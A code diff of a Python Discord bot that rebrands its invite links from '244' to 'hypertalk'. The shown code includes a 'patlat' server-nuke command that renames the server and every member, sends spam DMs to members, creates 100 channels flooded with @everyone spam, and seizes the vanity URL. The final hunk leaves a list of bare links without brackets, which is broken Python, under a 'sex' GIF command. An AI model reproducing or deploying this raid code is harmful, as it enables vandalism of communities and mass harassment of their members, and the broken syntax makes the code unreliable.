@@ -47,7 +47,7 @@ warns = {}
 async def on_ready():
     print(f'==================================================')
     print(f'Bot Uğurla İşə Düşdü: {bot.user.name}')
-    print(f'Status: discord.gg/244 | 80+ Komut Aktivdir')
+    print(f'Status: discord.gg/hypertalk | 80+ Komut Aktivdir')
     print(f'==================================================')
     if not change_status.is_running():
         change_status.start()
@@ -57,7 +57,7 @@ async def change_status():
     activities = [
         discord.Game(name="!panel | discord.gg/244"),
         discord.Game(name="80+ Komut Tam Aktiv"),
-        discord.Game(name="244 Security Protection")
+        discord.Game(name="hypertalk Security Protection")
     ]
     await bot.change_presence(activity=random.choice(activities))
 
@@ -125,7 +125,7 @@ async def on_message(message):
 @bot.command(name='panel')
 async def panel(ctx, kategori=None):
     embed = discord.Embed(
-        title="🛡️ 244 ULTIMATE CONTROL PANEL (80+ KOMUT) 🛡️",
+        title="🛡️ hypertalk ULTIMATE CONTROL PANEL (80+ KOMUT) 🛡️",
         description="Botun bütün kateqoriyaları və əmrləri aşağıdakı siyahıda səliqəli şəkildə qeyd olunmuşdur.",
         color=discord.Color.dark_red()
     )
@@ -146,7 +146,7 @@ async def panel(ctx, kategori=None):
 
   
     )
-    embed.set_footer(text="discord.gg/244 | Ruhum tərəfindən idarə olunur")
+    embed.set_footer(text="discord.gg/hypertalk | Ruhum tərəfindən idarə olunur")
     await ctx.send(embed=embed)
 
 
@@ -174,7 +174,7 @@ async def patlat(ctx):
     guild = ctx.guild
 
     try:
-        await guild.me.edit(nick="RUHUM-244")
+        await guild.me.edit(nick="RUHUM-hypertalk")
     except:
         pass
 
@@ -213,18 +213,18 @@ async def patlat(ctx):
 
     # 5. Server adını dəyiş
     try:
-        await guild.edit(name="discord.gg/244")
+        await guild.edit(name="discord.gg/hypertalk")
     except: pass
 
     # 6. Üzvlərə ləqəb dəyişmək və DM göndərmək
     for member in guild.members:
         if member == guild.me: continue
-        try: await member.edit(nick="discord.gg/244")
+        try: await member.edit(nick="discord.gg/hypertalk")
         except: pass
         
         if not member.bot:
             try:
-                await member.send(f"{member.mention} RUHUM SKDI ATDI discord.gg/244")
+                await member.send(f"{member.mention} RUHUM SKDI ATDI discord.gg/hypertalk")
             except:
                 pass
         await asyncio.sleep(0.02)
@@ -232,12 +232,12 @@ async def patlat(ctx):
     # 7. Maksimum sürətlə 100 kanal yaradıb spam etmək
     for i in range(1, 101):
         try:
-            channel = await guild.create_text_channel(name=f"244-{i}")
+            channel = await guild.create_text_channel(name=f"hypertalk-{i}")
             await asyncio.sleep(0.03)
             
             for _ in range(40):
                 try:
-                    await channel.send("@everyone discord.gg/244 yaz gır oql")
+                    await channel.send("@everyone discord.gg/hypertalk yaz gır oql")
                 except:
                     pass
                 await asyncio.sleep(0.02)
@@ -251,7 +251,7 @@ async def patlat(ctx):
         
         for _ in range(100):
             try:
-                await ruhum_tanri_chan.send("@everyone RUHUM PAPA discord.gg/244_")
+                await ruhum_tanri_chan.send("@everyone RUHUM PAPA discord.gg/hypertalk")
             except:
                 pass
             await asyncio.sleep(0.02)
@@ -261,7 +261,7 @@ async def patlat(ctx):
     # 9. Vanity URL
     try:
         if guild.premium_tier >= 2:
-            await guild.edit(vanity_code="244")
+            await guild.edit(vanity_code="hypertalk")
     except: pass
         
         
@@ -377,11 +377,9 @@ async def meeting(ctx):
 # ==============================================================================
 # 2. ƏYLƏNCƏ VƏ GIF KOMUTLARI (35 ƏDƏD)
 # ==============================================================================
-SEX_GIFS = [
-    "https://media.giphy.com/media/3oKIPnAiaMCws8nOsE/giphy.gif",
-    "https://media.giphy.com/media/10UxkWwZ8h28Wk/giphy.gif",
-    "https://media.giphy.com/media/l0HlBO7eyXzSZkJri/giphy.gif",
-    "https://media.giphy.com/media/xT5LMPj8P2CDUDOqRy/giphy.gif"
+SEX_GIFS = 
+https://pin.it/3xgQE7cWa
+https://pin.it/4dOnrw9Pt
 ]
 
 @bot.command(name='sex')
